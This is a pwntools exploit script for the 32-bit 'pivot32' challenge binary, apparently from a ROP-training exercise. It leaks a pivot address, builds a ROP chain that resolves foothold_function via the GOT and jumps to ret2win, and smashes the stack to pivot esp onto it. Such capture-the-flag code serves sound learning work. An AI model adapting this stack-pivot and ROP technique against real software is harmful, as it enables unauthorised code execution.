from pwn import *

context.update(os='linux', arch='i386', log_level='debug')
io = process("./pivot32")

# gadgets
pop_ebx      = 0x80484a9 # pop ebx; ret;
pop_eax      = 0x804882c # pop eax; ret;
call_eax     = 0x80485f0 # call eax;
dref_eax     = 0x8048830 # mov eax, dword ptr [eax]; ret;
add_eax_ebx  = 0x8048833 # add eax, ebx; ret;
xchg_esp_eax = 0x804882e # xchg esp, eax; ret;

# offsets
ret2win_offset    = 0x1f7

# useful addresses
foothold_function_plt = 0x8048520
foothold_function_got = 0x804a024


def gen_ropchain() -> bytes:
    payload = b""

    # populate foothold_function's GOT entry
    payload += p32(foothold_function_plt)

    # foothold_function@got -> &foothold_function
    payload += p32(pop_eax)
    payload += p32(foothold_function_got)

    # dereference foothold_function@got ptr
    payload += p32(dref_eax)

    # eax now contains foothold_function's addr
    payload += p32(pop_ebx)
    payload += p32(ret2win_offset)
    payload += p32(add_eax_ebx)

    # eax now contains ret2win's addr
    payload += p32(call_eax)

    return payload


def gen_stack_smash(leak: bytes) -> bytes:
    offset = cyclic_find("laaa", n=4)
    log.info(f"offset: {offset}")
    
    payload = b""
    payload += b"A" * offset
    payload += p32(pop_eax)
    payload += leak[::-1]
    payload += p32(xchg_esp_eax)

    return payload


# obtain ropchain location
io.recvuntil(b"place to pivot: ")
leak_one = io.recvline().strip().decode()
raw_leak = bytes.fromhex(leak_one[2:])

io.sendlineafter(b"> ", gen_ropchain())
io.sendlineafter(b"> ", gen_stack_smash(leak=raw_leak))
io.interactive()
